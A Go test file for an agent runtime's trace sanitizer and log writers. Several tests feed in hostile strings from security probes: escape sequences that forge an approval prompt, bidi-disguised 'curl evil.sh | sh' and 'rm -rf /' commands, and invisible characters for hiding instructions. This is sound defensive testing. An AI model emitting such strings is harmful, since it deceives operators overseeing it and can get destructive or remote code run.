package trace_test

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	agentrt "github.com/joeylking/agent-runtime"
	"github.com/joeylking/agent-runtime/trace"
)

func event(seq int64, typ, payload string) agentrt.Event {
	at := time.Date(2026, 9, 25, 14, 3, 4, 500_000_000, time.UTC)
	return agentrt.Event{Seq: seq, RunID: "r1", StepID: "s1", At: at, Type: typ, Payload: json.RawMessage(payload)}
}

func TestWriter_AlignedLine(t *testing.T) {
	var buf bytes.Buffer
	obs := trace.Writer(&buf)
	e := event(1, agentrt.EventStepDecided, `{"kind":"tool_call"}`)
	obs(e)
	line := strings.TrimSuffix(buf.String(), "\n")
	want := e.At.Local().Format("2006-01-02 15:04:05.000 -0700") + "  " + agentrt.EventStepDecided
	if !strings.HasPrefix(line, want) {
		t.Fatalf("line = %q, want it to start with %q", line, want)
	}
	if !strings.HasSuffix(line, ` {"kind":"tool_call"}`) {
		t.Fatalf("line = %q, want the payload last", line)
	}
	// The type column is padded to 22 so the payloads line up.
	prefix := e.At.Local().Format("2006-01-02 15:04:05.000 -0700")
	if got := strings.Index(line, `{`); got != len(prefix)+2+22+1 {
		t.Fatalf("payload starts at column %d in %q", got, line)
	}
}

func TestJSONL_OneObjectPerEvent(t *testing.T) {
	var buf bytes.Buffer
	obs := trace.JSONL(&buf)
	obs(event(1, agentrt.EventRunStarted, ""))
	obs(event(2, agentrt.EventStepPolicy, `{"reason":"a < b & c"}`))
	lines := strings.Split(strings.TrimSuffix(buf.String(), "\n"), "\n")
	if len(lines) != 2 {
		t.Fatalf("lines = %q", lines)
	}
	var first struct {
		Seq     int64           `json:"seq"`
		RunID   string          `json:"run_id"`
		StepID  string          `json:"step_id"`
		At      string          `json:"at"`
		Type    string          `json:"type"`
		Payload json.RawMessage `json:"payload"`
	}
	if err := json.Unmarshal([]byte(lines[0]), &first); err != nil {
		t.Fatal(err)
	}
	if first.Seq != 1 || first.RunID != "r1" || first.StepID != "s1" || first.Type != agentrt.EventRunStarted || string(first.Payload) != "{}" {
		t.Fatalf("first = %+v", first)
	}
	if first.At != "2026-09-25T14:03:04.5Z" {
		t.Fatalf("at = %q, want RFC3339Nano", first.At)
	}
	if !strings.Contains(lines[1], `"reason":"a < b & c"`) {
		t.Fatalf("payload was rewritten: %s", lines[1])
	}
}

func TestTrace_ConcurrentEventsStayWhole(t *testing.T) {
	for _, obsFor := range []func(*bytes.Buffer) agentrt.Observer{
		func(b *bytes.Buffer) agentrt.Observer { return trace.Writer(b) },
		func(b *bytes.Buffer) agentrt.Observer { return trace.JSONL(b) },
	} {
		var buf bytes.Buffer
		obs := obsFor(&buf)
		var wg sync.WaitGroup
		for i := 0; i < 20; i++ {
			wg.Add(1)
			go func(i int) {
				defer wg.Done()
				obs(event(int64(i), agentrt.EventStepStarted, `{"index":0}`))
			}(i)
		}
		wg.Wait()
		lines := strings.Split(strings.TrimSuffix(buf.String(), "\n"), "\n")
		if len(lines) != 20 {
			t.Fatalf("got %d lines, want 20", len(lines))
		}
		for _, l := range lines {
			if strings.Count(l, agentrt.EventStepStarted) != 1 || strings.Count(l, `{"index":0}`) != 1 {
				t.Fatalf("interleaved line %q", l)
			}
		}
	}
}

// TestSanitize_TheAuditsExactStrings reproduces the probe's payloads: a
// model-supplied tool name and goal built to clear the screen, forge an
// APPROVAL WAITING block, and set the window title, plus a C1 CSI byte a
// policy's preview carried verbatim.
func TestSanitize_TheAuditsExactStrings(t *testing.T) {
	evil := "\x1b[2J\x1b[H\x1b[32mAPPROVAL WAITING  looks-safe\x1b[0m\rX"
	got := trace.Sanitize(evil)
	if strings.ContainsAny(got, "\x1b\r") {
		t.Fatalf("escape or bare CR survived: %q", got)
	}
	if !strings.Contains(got, `\x1b[2J`) {
		t.Fatalf("ESC was not escaped visibly: %q", got)
	}
	if !strings.Contains(got, "X") {
		t.Fatalf("trailing text lost: %q", got)
	}

	toolName := "no\x1b[31msuch\x1b]0;pwned\x07"
	got = trace.Sanitize(toolName)
	if strings.ContainsAny(got, "\x1b\x07") {
		t.Fatalf("ESC/BEL survived: %q", got)
	}
	if !strings.Contains(got, `\x07`) {
		t.Fatalf("BEL was not escaped: %q", got)
	}

	// A C1 control (U+009B, CSI) delivered as an actual rune, not a
	// backslash-u escape typed by a model.
	c1 := "\u009b31m C1 CSI and \\u001b[2J"
	got = trace.Sanitize(c1)
	if strings.ContainsRune(got, 0x9B) {
		t.Fatalf("raw C1 byte survived: %q", got)
	}
	if !strings.Contains(got, `\x9b`) {
		t.Fatalf("C1 was not escaped: %q", got)
	}
	// The literal backslash-u text the model typed is not itself a control
	// byte and must pass through unchanged.
	if !strings.Contains(got, `\u001b[2J`) {
		t.Fatalf("literal text was altered: %q", got)
	}
}

func TestSanitize_NewlinesBecomeSpacesNotEscapes(t *testing.T) {
	got := trace.Sanitize("line one\nline two\r\nline three")
	if strings.ContainsAny(got, "\n\r") {
		t.Fatalf("newline survived: %q", got)
	}
	if strings.Contains(got, `\x0a`) || strings.Contains(got, `\x0d`) {
		t.Fatalf("newline was escaped instead of spaced: %q", got)
	}
	if got != "line one line two  line three" {
		t.Fatalf("got %q", got)
	}
}

func TestSanitize_InvalidUTF8BecomesReplacementCharacter(t *testing.T) {
	got := trace.Sanitize("valid \xff\xfe end")
	if !strings.Contains(got, "�") {
		t.Fatalf("invalid UTF-8 was not replaced: %q", got)
	}
	if !utf8.ValidString(got) {
		t.Fatalf("raw invalid bytes survived: %q", got)
	}
}

// TestWriter_SanitizesC1InThePayload: the payload is JSON, which escapes C0
// controls, but a C1 control such as U+009B is valid Unicode above the
// ASCII range and is not escaped by encoding/json, so it reaches the text
// writer as a raw two-byte UTF-8 sequence unless the writer sanitizes it.
func TestWriter_SanitizesC1InThePayload(t *testing.T) {
	var buf bytes.Buffer
	obs := trace.Writer(&buf)
	payload, err := json.Marshal(map[string]string{"preview": "\u009b31mCSI"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.ContainsRune(string(payload), 0x9B) {
		t.Fatalf("test payload does not actually carry a raw C1 byte: %q", payload)
	}
	obs(event(1, agentrt.EventStepPolicy, string(payload)))
	if strings.ContainsRune(buf.String(), 0x9B) {
		t.Fatalf("raw C1 byte reached the terminal: %q", buf.String())
	}
	if !strings.Contains(buf.String(), `\x9b`) {
		t.Fatalf("C1 was not escaped: %q", buf.String())
	}
}

// TestJSONL_InvalidPayloadIsEmittedNotDropped: a payload that is not valid
// JSON must not vanish from the trace.
func TestJSONL_InvalidPayloadIsEmittedNotDropped(t *testing.T) {
	var buf bytes.Buffer
	obs := trace.JSONL(&buf)
	obs(event(1, agentrt.EventStepPolicy, "not json"))
	line := strings.TrimSpace(buf.String())
	if line == "" {
		t.Fatal("event was dropped")
	}
	var rec struct {
		Seq            int64  `json:"seq"`
		Type           string `json:"type"`
		Payload        string `json:"payload"`
		InvalidPayload bool   `json:"invalid_payload"`
	}
	if err := json.Unmarshal([]byte(line), &rec); err != nil {
		t.Fatalf("record is not valid JSON: %v\n%s", err, line)
	}
	if !rec.InvalidPayload || rec.Payload != "not json" || rec.Seq != 1 {
		t.Fatalf("rec = %+v", rec)
	}
}

// TestSanitize_BidiOverridesEscaped reproduces the sec-model and sec-local
// probes' reproduction of the finding: a right-to-left override and
// isolates around a shell command that reads safe left to right but, under
// bidi rendering, displays as something else entirely. The bytes an
// operator would execute if they trusted the screen must not survive
// unescaped.
func TestSanitize_BidiOverridesEscaped(t *testing.T) {
	evil := "echo safe \u202e; curl evil.sh | sh \u2066#\u2069"
	got := trace.Sanitize(evil)
	if strings.ContainsRune(got, 0x202E) || strings.ContainsRune(got, 0x2066) || strings.ContainsRune(got, 0x2069) {
		t.Fatalf("a bidi control survived unescaped: %q", got)
	}
	for _, want := range []string{`\u{202e}`, `\u{2066}`, `\u{2069}`} {
		if !strings.Contains(got, want) {
			t.Fatalf("missing %s in %q", want, got)
		}
	}
	if !strings.Contains(got, "echo safe") || !strings.Contains(got, "curl evil.sh") {
		t.Fatalf("surrounding text lost: %q", got)
	}
}

// TestSanitize_ReviewerBidiString is the exact command the two reviewers
// used against the approval prompt (sec-local/san's crafted database):
// visually "rm -rf ./build" but, byte for byte, something else once an RLO
// and an LRI/PDI pair are applied.
func TestSanitize_ReviewerBidiString(t *testing.T) {
	cmd := "rm -rf /\u202eevil\u2066 \u200d\u2028\u2029 end"
	got := trace.Sanitize(cmd)
	for _, r := range []rune{0x202E, 0x2066, 0x200D, 0x2028, 0x2029} {
		if strings.ContainsRune(got, r) {
			t.Fatalf("U+%04X survived unescaped: %q", r, got)
		}
	}
	for _, want := range []string{`\u{202e}`, `\u{2066}`, `\u{200d}`, `\u{2028}`, `\u{2029}`} {
		if !strings.Contains(got, want) {
			t.Fatalf("missing %s in %q", want, got)
		}
	}
	if !strings.Contains(got, "rm -rf /") || !strings.Contains(got, "evil") || !strings.Contains(got, "end") {
		t.Fatalf("surrounding text lost: %q", got)
	}
}

// TestSanitize_ZeroWidthAndInvisibleEscaped covers the zero-width and other
// invisible formatting characters a model could use to hide instructions
// inside what looks, on screen, like a short and unremarkable value.
func TestSanitize_ZeroWidthAndInvisibleEscaped(t *testing.T) {
	for _, r := range []rune{0x200B, 0x200C, 0x200D, 0x2060, 0x2064, 0xFEFF, 0x00AD, 0x180E, 0x061C, 0x200E, 0x200F} {
		in := fmt.Sprintf("a%cb", r)
		got := trace.Sanitize(in)
		if strings.ContainsRune(got, r) {
			t.Fatalf("U+%04X survived unescaped: %q", r, got)
		}
		want := fmt.Sprintf(`\u{%04x}`, r)
		if !strings.Contains(got, want) {
			t.Fatalf("U+%04X not escaped as %s: %q", r, want, got)
		}
		if !strings.Contains(got, "a") || !strings.Contains(got, "b") {
			t.Fatalf("surrounding text lost for U+%04X: %q", r, got)
		}
	}
}

// TestSanitize_LineAndParagraphSeparatorsEscaped: U+2028 and U+2029 are
// valid inside a Go string and inside JSON, but Sanitize's caller prints
// its result as a single terminal line, so either one must not reach the
// terminal as a literal line break.
func TestSanitize_LineAndParagraphSeparatorsEscaped(t *testing.T) {
	got := trace.Sanitize("a b c")
	if strings.ContainsRune(got, 0x2028) || strings.ContainsRune(got, 0x2029) {
		t.Fatalf("a line/paragraph separator survived unescaped: %q", got)
	}
	if !strings.Contains(got, `\u{2028}`) || !strings.Contains(got, `\u{2029}`) {
		t.Fatalf("not escaped visibly: %q", got)
	}
}

// TestSanitize_TagBlockEscaped: the tag block (U+E0000-U+E007F) has no
// visible glyphs of its own and has been used to smuggle instructions
// invisibly alongside ordinary text.
func TestSanitize_TagBlockEscaped(t *testing.T) {
	got := trace.Sanitize("safe\U000E0001\U000E0041\U000E007Ftext")
	for _, r := range []rune{0xE0001, 0xE0041, 0xE007F} {
		if strings.ContainsRune(got, r) {
			t.Fatalf("U+%04X (tag block) survived unescaped: %q", r, got)
		}
	}
	if !strings.Contains(got, "safe") || !strings.Contains(got, "text") {
		t.Fatalf("surrounding text lost: %q", got)
	}
}

// TestSanitize_ExcessCombiningMarksCutWithMarker reproduces the reviewers'
// long combining-mark run stacked on one base character, which grows a
// single character's on-screen height across many terminal lines. The first
// few marks (real accents can legitimately stack two or three deep) survive
// and the rest are cut with a visible count, not silently dropped.
func TestSanitize_ExcessCombiningMarksCutWithMarker(t *testing.T) {
	base := "a"
	marks := strings.Repeat("́", 45) // combining acute accent x45
	got := trace.Sanitize(base + marks + " end")
	if strings.Count(got, "́") != 4 {
		t.Fatalf("want exactly 4 combining marks kept, got %d: %q", strings.Count(got, "́"), got)
	}
	if !strings.Contains(got, "[+41 combining marks dropped]") {
		t.Fatalf("missing a visible count of dropped marks: %q", got)
	}
	if !strings.HasPrefix(got, "á́́́[+41") {
		t.Fatalf("kept marks or marker not where expected: %q", got)
	}
	if !strings.HasSuffix(got, " end") {
		t.Fatalf("trailing text lost: %q", got)
	}
}

// TestSanitize_FewCombiningMarksSurviveUnmarked: a short, ordinary
// combining sequence (well under the cap) must not be flagged or altered.
func TestSanitize_FewCombiningMarksSurviveUnmarked(t *testing.T) {
	in := "café" // café spelled with a combining acute accent
	got := trace.Sanitize(in)
	if got != in {
		t.Fatalf("got %q, want unchanged %q", got, in)
	}
	if strings.Contains(got, "dropped") {
		t.Fatalf("a legitimate short sequence was flagged: %q", got)
	}
}

// TestSanitize_LegitimateScriptsAndEmojiSurvive: the fix must not turn
// Sanitize into a Latin-only filter. Arabic, Hebrew, Hindi (Devanagari,
// which combines a base consonant with vowel marks), Thai (which stacks a
// tone mark over a vowel mark), Japanese, and a flag emoji (built from two
// regional indicator code points, not a control) must all survive
// unchanged.
func TestSanitize_LegitimateScriptsAndEmojiSurvive(t *testing.T) {
	for _, s := range []string{
		"مرحبا بالعالم",        // Arabic: "hello world"
		"שלום עולם",            // Hebrew: "hello world"
		"नमस्ते",               // Hindi (Devanagari), combining vowel signs
		"สวัสดี",               // Thai, stacked tone/vowel marks
		"こんにちは世界",              // Japanese
		"\U0001F1EF\U0001F1F5", // 🇯🇵 flag emoji, two regional indicators
	} {
		if got := trace.Sanitize(s); got != s {
			t.Fatalf("legitimate text altered: %q -> %q", s, got)
		}
	}
}

type failingWriter struct{ err error }

func (f failingWriter) Write([]byte) (int, error) { return 0, f.err }

func TestWriterWithErr_SurfacesAWriteFailure(t *testing.T) {
	wantErr := errors.New("disk full")
	obs, errFn := trace.WriterWithErr(failingWriter{wantErr})
	if errFn() != nil {
		t.Fatal("Err before any write must be nil")
	}
	obs(event(1, agentrt.EventStepStarted, `{}`))
	if err := errFn(); !errors.Is(err, wantErr) {
		t.Fatalf("Err() = %v, want %v", err, wantErr)
	}
}

func TestJSONLWithErr_SurfacesAWriteFailure(t *testing.T) {
	wantErr := errors.New("disk full")
	obs, errFn := trace.JSONLWithErr(failingWriter{wantErr})
	obs(event(1, agentrt.EventStepStarted, `{}`))
	if err := errFn(); !errors.Is(err, wantErr) {
		t.Fatalf("Err() = %v, want %v", err, wantErr)
	}
}

// A JSON Lines record is exactly what it was before events were chained:
// the hash a stored event carries is read through the store, never through
// Event, so an event read back from a database prints byte for byte as
// these literals, which consumers compare traces against.
func TestJSONL_RecordIsByteStable(t *testing.T) {
	st, err := agentrt.OpenStore(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	at := time.Date(2026, 9, 25, 14, 3, 4, 500_000_000, time.UTC)
	ids := 0
	d, err := agentrt.NewDriver(agentrt.Config{Store: st, Policy: agentrt.DefaultPolicy(),
		Agent: agentFunc(func(context.Context, agentrt.StepInput) (agentrt.Decision, error) {
			return agentrt.Decision{Kind: agentrt.DecideComplete, Result: []byte(`{"a":"<b>"}`)}, nil
		}),
		Now:   func() time.Time { return at },
		NewID: func() string { ids++; return fmt.Sprintf("id-%d", ids) }})
	if err != nil {
		t.Fatal(err)
	}
	run, err := d.Start(context.Background(), "g", agentrt.DefaultLimits())
	if err != nil {
		t.Fatal(err)
	}
	events, err := st.ListEvents(context.Background(), run.ID)
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	obs := trace.JSONL(&buf)
	for _, e := range events[1:] {
		obs(e)
	}
	want := `{"seq":2,"run_id":"id-1","at":"2026-09-25T14:03:04.5Z","type":"run.started","payload":{}}
{"seq":3,"run_id":"id-1","step_id":"id-2","at":"2026-09-25T14:03:04.5Z","type":"step.started","payload":{"index":0}}
{"seq":4,"run_id":"id-1","step_id":"id-2","at":"2026-09-25T14:03:04.5Z","type":"step.decided","payload":{"kind":"complete","result":{"a":"\u003cb\u003e"}}}
{"seq":5,"run_id":"id-1","at":"2026-09-25T14:03:04.5Z","type":"run.finished","payload":{"detail":"","reason":"goal_completed","status":"COMPLETED","steps":1}}
`
	if buf.String() != want {
		t.Fatalf("JSON Lines changed:\n%s\nwant\n%s", buf.String(), want)
	}
}

type agentFunc func(context.Context, agentrt.StepInput) (agentrt.Decision, error)

func (f agentFunc) Decide(ctx context.Context, in agentrt.StepInput) (agentrt.Decision, error) {
	return f(ctx, in)
}
